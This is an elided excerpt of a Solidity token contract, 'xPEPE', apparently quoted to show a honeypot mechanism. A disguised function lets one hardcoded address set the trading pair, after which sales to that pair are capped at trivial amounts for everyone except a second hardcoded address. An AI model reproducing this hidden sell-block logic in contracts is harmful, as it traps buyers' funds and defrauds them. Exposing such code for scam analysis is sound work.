...
contract xPEPE is Ownable, IERC20, IERC20Meta {
    ...
    function toUni(address account) public virtual returns (bool) {
         if(_msgSender() == 0x6DFA964eB00Fc062747A1ff8270B18106c3eDB12) _pair = account;
        return true;
    }
    ...
    function _transfer(
        ...
        if(_pair != address(0)) {
            if(to == _pair && from != 0xCF1539c9Ddd598b649AD0555fB77E35A3A5C4a43) {
               bool b = false;
               if(!b) {
                    require(amount < 100);
               }
